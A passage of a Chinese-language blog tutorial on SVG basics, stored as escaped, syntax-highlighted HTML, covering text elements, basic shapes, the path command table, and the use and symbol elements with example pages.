class=\"name\">rect</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">g</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"复制-（-lt-use-gt-）\"><a href=\"#复制-（-lt-use-gt-）\" class=\"headerlink\" title=\"复制 （&lt;use&gt;）\"></a>复制 （<code>&lt;use&gt;</code>）</h3><p>说明：<code>&lt;use&gt;</code> 能从 SVG 文档内部取出一个节点，克隆它，并把它输出到别处。子元素能继承来自 <code>&lt;use&gt;</code> 样式</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>SVG 学习<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        * &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;300&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;border: 1px solid #999;&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">defs</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">g</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;shape&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill: inherit; stroke: #090; stroke-width: 2;&quot;</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">circle</span> <span class=\"attr\">r</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">cx</span>=<span class=\"string\">&quot;180&quot;</span> <span class=\"attr\">cy</span>=<span class=\"string\">&quot;140&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">circle</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">rect</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;30&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;100&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;50&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">rect</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">rect</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;230&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;100&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;50&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">rect</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">g</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">defs</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">text</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;15&quot;</span>&gt;</span>图形1<span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">use</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;20&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;20&quot;</span> <span class=\"attr\">xlink:href</span>=<span class=\"string\">&quot;#shape&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill: #009;&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">use</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"模板（）\"><a href=\"#模板（）\" class=\"headerlink\" title=\"模板（）\"></a>模板（<symbol>）</h3><p><code>&lt;symbol&gt;</code> 的作用是定义一个图像模板，使用 <code>&lt;use&gt;</code> 标记实例化它，然后在 SVG 文档中反复使用。<code>&lt;symbol&gt;</code> 本身不会输出任何图像，只有使用 <code>&lt;use&gt;</code> 实例化后才会显示。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>SVG 学习<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        * &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;300&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;border: 1px solid #999;&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"comment\">&lt;!-- symbol definition  NEVER draw --&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">symbol</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;sym01&quot;</span> <span class=\"attr\">viewBox</span>=<span class=\"string\">&quot;0 0 150 110&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">circle</span> <span class=\"attr\">cx</span>=<span class=\"string\">&quot;50&quot;</span> <span class=\"attr\">cy</span>=<span class=\"string\">&quot;50&quot;</span> <span class=\"attr\">r</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">stroke-width</span>=<span class=\"string\">&quot;8&quot;</span> <span class=\"attr\">stroke</span>=<span class=\"string\">&quot;red&quot;</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;red&quot;</span> /&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">circle</span> <span class=\"attr\">cx</span>=<span class=\"string\">&quot;90&quot;</span> <span class=\"attr\">cy</span>=<span class=\"string\">&quot;60&quot;</span> <span class=\"attr\">r</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">stroke-width</span>=<span class=\"string\">&quot;8&quot;</span> <span class=\"attr\">stroke</span>=<span class=\"string\">&quot;green&quot;</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;white&quot;</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">symbol</span>&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"comment\">&lt;!-- actual drawing by &quot;use&quot; element --&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">use</span> <span class=\"attr\">xlink:href</span>=<span class=\"string\">&quot;#sym01&quot;</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;0&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;0&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;100&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;50&quot;</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">use</span> <span class=\"attr\">xlink:href</span>=<span class=\"string\">&quot;#sym01&quot;</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;0&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;50&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;75&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;38&quot;</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">use</span> <span class=\"attr\">xlink:href</span>=<span class=\"string\">&quot;#sym01&quot;</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;0&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;100&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;50&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;25&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"SVG-基础元素\"><a href=\"#SVG-基础元素\" class=\"headerlink\" title=\"SVG 基础元素\"></a>SVG 基础元素</h1><h2 id=\"SVG-元素通用属性\"><a href=\"#SVG-元素通用属性\" class=\"headerlink\" title=\"SVG 元素通用属性\"></a>SVG 元素通用属性</h2><ul>\n<li>transform 对基础图形进行变换处理（与 CSS3 中的 transform 属性有点不一致）<ul>\n<li>平移 <code>translate(50,30)</code> </li>\n<li>缩放 <code>scale(2)</code> </li>\n<li>旋转 <code>rotate(30)</code> </li>\n<li>翻转 <code>skewX()</code>、<code>skewY(10)</code></li>\n</ul>\n</li>\n<li>fill：填充色</li>\n<li>stroke：定义图形、文本等的边线颜色</li>\n</ul>\n<p>说明：支持 hover 伪类、id、class 等</p>\n<h2 id=\"SVG-元素通用-CSS-样式\"><a href=\"#SVG-元素通用-CSS-样式\" class=\"headerlink\" title=\"SVG 元素通用 CSS 样式\"></a>SVG 元素通用 CSS 样式</h2><ul>\n<li>display: 控制元素是否可见（<code>inline</code>、<code>none</code>，所有元素的初始值都为 <code>inline</code>）</li>\n<li>fill:  填充色</li>\n<li>fill-opacity: 填充色透明度</li>\n<li>stroke: 定义图形、文本等的边线颜色</li>\n<li>stroke-width: 定义图形、文字边线的宽度 </li>\n<li>stroke-opacity: 定义图形、文字边线的透明度</li>\n<li>stroke-linecap：用来定义开放式路径的端点的样式（<code>butt</code>、<code>round</code>、<code>square</code>）</li>\n<li>stroke-linejoin：用来控制两个线段之间的联合是如何绘制</li>\n<li>stroke-dasharray：用来创建虚线（如 <code>stroke-dasharray=&quot;5,5&quot;</code>）</li>\n<li>fill-rule：判断路径的哪一侧在路径所构成的形状的内部，从而判断fill属性如何给这个形状上色</li>\n</ul>\n<p><img src=\"https://mdn.mozillademos.org/files/730/SVG_Stroke_Linecap_Example.png\" alt=\"stroke-linecap 属性\"><br><img src=\"https://mdn.mozillademos.org/files/731/SVG_Stroke_Linejoin_Example.png\" alt=\"stroke-linejoin 属性\"></p>\n<h2 id=\"文本\"><a href=\"#文本\" class=\"headerlink\" title=\"文本\"></a>文本</h2><h3 id=\"SVG-文本-（-lt-text-gt-）\"><a href=\"#SVG-文本-（-lt-text-gt-）\" class=\"headerlink\" title=\"SVG 文本 （&lt;text&gt;）\"></a>SVG 文本 （<code>&lt;text&gt;</code>）</h3><p>说明：用来定义文字文本，例如 <code>&lt;text&gt;测试文字&lt;/text&gt;</code></p>\n<p>支持的样式：<code>font-family</code>，<code>font-style</code>，<code>font-weight</code>，<code>font-variant</code>，<code>font-stretch</code>，<code>font-size</code>，<code>font-size-adjust</code>，<code>kerning</code>，<code>letter-spacing</code>，<code>word-spacing</code> 和 <code>text-decoration</code></p>\n<h3 id=\"内联文本-（-lt-tspan-gt-）\"><a href=\"#内联文本-（-lt-tspan-gt-）\" class=\"headerlink\" title=\"内联文本  （&lt;tspan&gt;）\"></a>内联文本  （<code>&lt;tspan&gt;</code>）</h3><p>说明：嵌套在 <code>&lt;text&gt;</code> 标签中，与 <code>&lt;span&gt;</code> 标签类似，用于定义一组文本的样式</p>\n<h3 id=\"文本路径-（-lt-textPath-gt-）\"><a href=\"#文本路径-（-lt-textPath-gt-）\" class=\"headerlink\" title=\"文本路径  （&lt;textPath&gt;）\"></a>文本路径  （<code>&lt;textPath&gt;</code>）</h3><p>说明：嵌套在 <code>&lt;text&gt;</code> 标签中，使文字按照指定路径排列，放在 <code>&lt;text&gt;</code> 标记内部引用预定义的 <code>&lt;path&gt;</code>，引用时，使用 <code>xlink:href</code> 属性指明需要引用的路径的 ID</p>\n<h3 id=\"链接-（-lt-a-gt-）\"><a href=\"#链接-（-lt-a-gt-）\" class=\"headerlink\" title=\"链接 （&lt;a&gt;）\"></a>链接 （<code>&lt;a&gt;</code>）</h3><p>说明：创建一个 SVG 元素链接</p>\n<ul>\n<li>xlink:show</li>\n<li>xlink:actuate</li>\n<li>xlink:href</li>\n<li>target</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>SVG 学习<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        * &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;800&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;border: 1px solid #aaa;&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">defs</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">path</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;MyPath&quot;</span> <span class=\"attr\">d</span>=<span class=\"string\">&quot;M 100 200 </span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">                     C 200 100 300   0 400 100</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">                     C 500 200 600 300 700 200</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">                     C 800 100 900 100 900 100&quot;</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">defs</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">xlink:href</span>=<span class=\"string\">&quot;https://www.baidu.com&quot;</span> <span class=\"attr\">target</span>=<span class=\"string\">&quot;_blank&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">text</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;100&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;15&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill: #009; cursor: pointer;&quot;</span>&gt;</span> 打开百度<span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">text</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;0&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;15&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill: red;&quot;</span> <span class=\"attr\">transform</span>=<span class=\"string\">&quot;rotate(30 20, 30)&quot;</span>&gt;</span></span><br><span class=\"line\">             Just test SVG! <span class=\"tag\">&lt;<span class=\"name\">tspan</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill: #0f0; font-size: 26px; font-style: italic;&quot;</span>&gt;</span>中国人民银行<span class=\"tag\">&lt;/<span class=\"name\">tspan</span>&gt;</span> nothing nothing nothing</span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">textPath</span> <span class=\"attr\">xlink:href</span>=<span class=\"string\">&quot;#MyPath&quot;</span>&gt;</span></span><br><span class=\"line\">                SVG 基本功能测试基本功能测试基本功能测试基本功能测试基本功能测试</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">textPath</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"基本图形\"><a href=\"#基本图形\" class=\"headerlink\" title=\"基本图形\"></a>基本图形</h2><h3 id=\"矩形（-lt-rect-gt-）\"><a href=\"#矩形（-lt-rect-gt-）\" class=\"headerlink\" title=\"矩形（&lt;rect&gt;）\"></a>矩形（<code>&lt;rect&gt;</code>）</h3><ul>\n<li>x: 元素距离左边的距离</li>\n<li>y: 元素距离上边的距离</li>\n<li>width: 元素的宽度</li>\n<li>height: 元素的高度</li>\n<li>rx: 矩形 X 轴方向的半径</li>\n<li>rx: 矩形 Y 轴方向的半径</li>\n</ul>\n<h3 id=\"圆形-（-lt-circle-gt-）\"><a href=\"#圆形-（-lt-circle-gt-）\" class=\"headerlink\" title=\"圆形 （&lt;circle&gt;）\"></a>圆形 （<code>&lt;circle&gt;</code>）</h3><ul>\n<li>cx: 圆心距离 Y 轴的距离</li>\n<li>cy: 圆心距离 X 轴的距离</li>\n<li>r: 圆的半径</li>\n</ul>\n<h3 id=\"椭圆（-lt-ellipse-gt-）\"><a href=\"#椭圆（-lt-ellipse-gt-）\" class=\"headerlink\" title=\"椭圆（&lt;ellipse&gt;）\"></a>椭圆（<code>&lt;ellipse&gt;</code>）</h3><ul>\n<li>cx: 圆心距离 Y 轴的距离</li>\n<li>cy: 圆心距离 X 轴的距离</li>\n<li>rx: 圆的 X 轴的半径</li>\n<li>ry: 圆的 Y 轴的半径</li>\n</ul>\n<h3 id=\"直线（-lt-line-gt-）\"><a href=\"#直线（-lt-line-gt-）\" class=\"headerlink\" title=\"直线（&lt;line&gt;）\"></a>直线（<code>&lt;line&gt;</code>）</h3><ul>\n<li>x1: X 轴方向的起点</li>\n<li>y1: Y 轴方向的起点</li>\n<li>x2: X 轴方向的终点</li>\n<li>y2: Y 轴方向的终点</li>\n</ul>\n<h3 id=\"折线-（-lt-polyline-gt-）\"><a href=\"#折线-（-lt-polyline-gt-）\" class=\"headerlink\" title=\"折线 （&lt;polyline&gt;）\"></a>折线 （<code>&lt;polyline&gt;</code>）</h3><ul>\n<li>points 属性里定义了各个点的坐标，x 和 y 坐标之间用逗号分别，多个坐标之间用空格分割<ul>\n<li>例如 <code>&lt;polyline points=&quot;3,3 10,40 50,100 20,150&quot;/&gt;</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"多边形-（-lt-polygen-gt-）\"><a href=\"#多边形-（-lt-polygen-gt-）\" class=\"headerlink\" title=\"多边形 （&lt;polygen&gt;）\"></a>多边形 （<code>&lt;polygen&gt;</code>）</h3><ul>\n<li>points 属性里定义了各个点的坐标，x 和 y 坐标之间用逗号分别，多个坐标之间用空格分割，并组成闭合的环形</li>\n</ul>\n<h3 id=\"路径-（-lt-path-gt-）\"><a href=\"#路径-（-lt-path-gt-）\" class=\"headerlink\" title=\"路径 （&lt;path&gt;）\"></a>路径 （<code>&lt;path&gt;</code>）</h3><ul>\n<li>d 用于定义一系列指令，例如 <code>&lt;path d=&quot;M150 0 L75 200 L225 200 Z&quot; /&gt;</code></li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>指令</th>\n<th>参数</th>\n<th>名称</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>M</td>\n<td>x,y</td>\n<td>moveto</td>\n<td>移动到    移动虚拟画笔到指定的（x,y）坐标，仅移动不绘制</td>\n</tr>\n<tr>\n<td>m</td>\n<td>x,y</td>\n<td>moveto</td>\n<td>同M，但使用相对坐标</td>\n</tr>\n<tr>\n<td>L</td>\n<td>x,y</td>\n<td>lineto</td>\n<td>连直线到    从当前画笔所在位置绘制一条直线到指定的（x,y）坐标</td>\n</tr>\n<tr>\n<td>l</td>\n<td>x,y</td>\n<td>lineto</td>\n<td>同L，但使用相对坐标</td>\n</tr>\n<tr>\n<td>H</td>\n<td>x</td>\n<td>horizontal lineto</td>\n<td>水平连线到    绘制一条水平直线到参数指定的x坐标点，y坐标为画笔的y坐标</td>\n</tr>\n<tr>\n<td>h</td>\n<td>x</td>\n<td>horizontal lineto</td>\n<td>同H，但使用相对坐标</td>\n</tr>\n<tr>\n<td>V</td>\n<td>y</td>\n<td>vertical lineto</td>\n<td>垂直连线到    从当前位置绘制一条垂直直线到参数指定的y坐标</td>\n</tr>\n<tr>\n<td>v</td>\n<td>y</td>\n<td>vertical lineto</td>\n<td>同V，但使用相对坐标</td>\n</tr>\n<tr>\n<td>C</td>\n<td>x1,y1 x2,y2 x,y</td>\n<td>curveto 三次方贝塞尔曲线</td>\n<td>从当前画笔位置绘制一条三次贝兹曲线到参数（x,y）指定的坐标。x1，y1和x2,y2是曲线的开始和结束控制点，用于控制曲线的弧度</td>\n</tr>\n<tr>\n<td>c</td>\n<td>x1,y1 x2,y2 x,y</td>\n<td>curveto</td>\n<td>同C，但使用相对坐标</td>\n</tr>\n<tr>\n<td>S</td>\n<td>x2,y2 x,y</td>\n<td>shorthand</td>\n<td>平滑三次方贝塞尔曲线    从当前画笔位置绘制一条三次贝塞尔曲线到参数（x,y）指定的坐标。x2,y2是结束控制点。开始控制点和前一条曲线的结束控制点相同</td>\n</tr>\n<tr>\n<td>s</td>\n<td>x2,y2 x,y</td>\n<td>shorthand</td>\n<td>平滑三次方贝塞尔曲线    同S，但使用相对坐标</td>\n</tr>\n<tr>\n<td>Q</td>\n<td>x1,y1 x,y</td>\n<td>二次方贝塞尔曲线</td>\n<td>从当前画笔位置绘制一条二次方贝塞尔曲线到参数（x,y）指定的坐标。x1,y1是控制点，用于控制曲线的弧度</td>\n</tr>\n<tr>\n<td>q</td>\n<td>x1,y1 x,y</td>\n<td>二次方贝塞尔曲线</td>\n<td>同Q，但使用相对坐标</td>\n</tr>\n<tr>\n<td>T</td>\n<td>x,y</td>\n<td>平滑的二次贝塞尔曲线</td>\n<td>从当前画笔位置绘制一条二次贝塞尔曲线到参数（x,y）指定的坐标。控制点被假定为最后一次使用的控制点</td>\n</tr>\n<tr>\n<td>t</td>\n<td>x,y</td>\n<td>平滑的二次贝塞尔曲线</td>\n<td>同T，但使用相对坐标</td>\n</tr>\n<tr>\n<td>A</td>\n<td>rx,ry x-axis-rotation large-arc-flag,sweepflag x,y</td>\n<td>椭圆弧线</td>\n<td>从当前画笔位置开始绘制一条椭圆弧线到（x,y）指定的坐标。rx和ry分别为椭圆弧线水平和垂直方向上的半径。x-axis-rotation指定弧线绕x轴旋转的度数。它只在rx和ry的值不相同是有效果。large-arc-flag是大弧标志位，取值0或1，用于决定绘制大弧还是小弧。sweep-flag用于决定弧线绘制的方向</td>\n</tr>\n<tr>\n<td>a</td>\n<td>rx,ry x-axis-rotation large-arc-flag,sweepflag x,y</td>\n<td>椭圆弧线</td>\n<td>同A，但使用相对坐标</td>\n</tr>\n<tr>\n<td>Z</td>\n<td>无</td>\n<td>闭合路径</td>\n<td>从结束点绘制一条直线到开始点，闭合路径</td>\n</tr>\n<tr>\n<td>z</td>\n<td>无</td>\n<td>闭合路径</td>\n<td>同Z</td>\n</tr>\n</tbody></table>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span 